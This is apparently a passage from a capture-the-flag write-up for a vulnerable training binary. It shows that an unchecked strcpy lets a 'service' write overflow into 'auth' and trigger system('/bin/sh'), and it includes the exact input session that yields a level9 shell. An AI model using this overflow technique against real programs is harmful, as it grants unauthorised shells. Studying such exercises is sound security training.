...
We decompile the C code using **Dogbolt**.
...
The function: 
- adjusts the stack pointer to ensure it is aligned to a 16-byte boundary, adhering to the System V AMD64 ABI calling convention
...
`auth` global variable is only allocating 4 bytes, but `strcpy(a)` copies user-controlled data without bounds checking. This allows an overflow into adjacent memory.

`auth` and `service` variables are close in memory (16 bytes apart).

Writing to `service` can overwrite `auth[32]`. Since `auth[32]` is nonzero, it executes `system("/bin/sh")`, giving a shell.
...
auth 
0x804a008, (nil) 
serviceeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
0x804a008, 0x804a018 
login
$ whoami
level9
